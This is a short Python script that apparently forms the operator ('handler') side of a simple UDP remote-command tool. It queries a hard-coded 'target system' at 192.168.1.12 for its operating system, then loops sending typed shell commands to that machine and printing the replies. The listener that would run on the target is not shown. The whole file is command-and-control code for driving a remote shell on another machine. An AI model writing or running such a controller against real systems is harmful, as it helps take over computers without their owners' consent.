import socket,time,os,sys,subprocess

#UDP socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

# myaddress without network connection
target_address=("192.168.1.12", 9999) # target system IP address

# Introduction
user=input("Enter your handler: ")
os.system("clear") # clear my screen
print("\t\t\t\t welcome ",user)
print("Checking target OS")
wait_os = "tell me your name"
s.sendto(wait_os.encode('ascii'),target_address)
# To recieve OS Details
oscheck=s.recvfrom(10)
print(oscheck)

if oscheck[0].decode('ascii') == 'darwin' :
    print("Target Machine is MAC OS ")
    time.sleep(1)
    print("Please send Commands related to MAC ")

elif oscheck[0].decode('ascii') == 'linux' :
    print("Target Machine is Linux OS ")
    time.sleep(1)
    print("Please send Commands related to Linux ")

elif oscheck[0].decode('ascii') == 'win32' :
    print("Target Machine is Windows based OS ")
    time.sleep(1)
    print("Please send Commands related to Windows ")

while True:
    cmd = input("Enter your command: ]")
    # logics
    if cmd == 'exit' or cmd == 'logout' :
        print("Disconnecting to remote host..")
        exit()  # Closing my python programe
    s.sendto(cmd.encode('ascii'), target_address)
    print("Instruction sent...")
    time.sleep(1)
    print("Waiting for response!")
    output=s.recvfrom(100)
    print(output[0].decode())

s.close()